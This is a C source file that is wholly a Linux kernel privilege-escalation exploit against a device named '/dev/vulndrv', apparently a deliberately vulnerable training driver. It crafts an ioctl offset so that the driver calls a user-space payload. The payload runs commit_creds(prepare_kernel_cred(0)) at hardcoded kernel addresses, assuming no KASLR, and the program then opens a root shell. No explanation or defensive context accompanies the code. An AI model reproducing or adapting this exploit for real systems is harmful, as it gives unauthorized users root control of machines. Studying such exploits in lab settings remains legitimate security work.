#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#define DEVICE_PATH "/dev/vulndrv"


#define KERNCALL __attribute__((regparm(3)))
   void* (*prepare_kernel_cred)(void*) KERNCALL ;
   void (*commit_creds)(void*) KERNCALL ;
   void payload(){
       //no kaslr
        prepare_kernel_cred = 0xffffffff81079ec0;
        commit_creds=0xffffffff81079c10;
        commit_creds(prepare_kernel_cred(0));
   }


typedef struct drv_req {
    unsigned long offset;
} drv_req;




int main(int argc, char *argv[])
{
    int fd = open(DEVICE_PATH, O_RDONLY);
    drv_req req;
    unsigned long ops_addr = 0xffffffffa00007c0;
    req.offset = ((unsigned long)&payload - ops_addr)/8;

    ioctl(fd, 0, &req);
    system("/bin/sh");
    return 0;
}

